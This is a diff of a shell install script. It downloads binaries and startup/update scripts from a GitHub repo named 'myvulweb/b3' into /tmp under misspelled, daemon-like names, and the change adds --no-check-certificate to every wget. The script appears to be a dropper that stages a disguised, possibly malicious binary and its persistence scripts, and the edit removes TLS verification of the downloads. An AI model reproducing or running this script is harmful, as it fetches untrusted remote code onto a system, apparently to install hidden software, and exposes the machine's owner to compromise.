@@ -12,13 +12,13 @@ chmod 777 setup.sh
 #install end#####################
 
 #down and checkmd5
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/lainudxd
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/lainudxt
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/lainudx-home
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/lainudx-ver.txt
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/lainudx-update.sh
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/lainudx-startup.sh
-wget https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/lainudxd
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/lainudxt
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/lainudx-home
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/lainudx-ver.txt
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/lainudx-update.sh
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/lainudx-startup.sh
+wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5
 
 check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudxt | cut -d " " -f1\``
 check2=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudxd | cut -d " " -f1\``
